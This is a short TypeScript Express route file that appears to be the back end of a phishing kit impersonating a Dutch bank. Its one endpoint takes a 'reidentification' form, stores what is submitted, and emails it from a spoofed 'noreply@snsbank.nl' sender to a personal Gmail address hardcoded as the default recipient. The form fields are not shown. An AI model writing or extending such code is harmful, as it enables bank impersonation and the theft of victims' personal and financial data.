import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { formDataSchema } from "@shared/schema";
import { sendEmail, generateReidentificationEmail } from "./services/resend";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Submit reidentification form
  app.post("/api/reidentification/submit", async (req, res) => {
    try {
      // Validate the form data
      const validatedData = formDataSchema.parse(req.body);
      
      // Store the submission
      const submission = await storage.createReidentificationSubmission({
        submissionData: validatedData
      });
      
      // Generate email content
      const emailContent = generateReidentificationEmail(validatedData);
      
      // Send email using Resend
      const emailParams = {
        to: process.env.ADMIN_EMAIL || "punkin199573@gmail.com",
        from: process.env.FROM_EMAIL || "noreply@snsbank.nl",
        subject: emailContent.subject,
        html: emailContent.html,
        text: emailContent.text
      };
      
      const emailSent = await sendEmail(emailParams);
      
      // Update email status
      await storage.updateReidentificationEmailStatus(
        submission.id, 
        emailSent ? "true" : "false"
      );
      
      res.json({ 
        success: true, 
        submissionId: submission.id,
        emailSent: emailSent
      });
      
    } catch (error) {
      console.error("Reidentification submission error:", error);
      
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          message: "Validatiefout in formuliergegevens",
          errors: error.errors 
        });
      } else {
        res.status(500).json({ 
          message: "Er is een fout opgetreden bij het verzenden van je gegevens" 
        });
      }
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
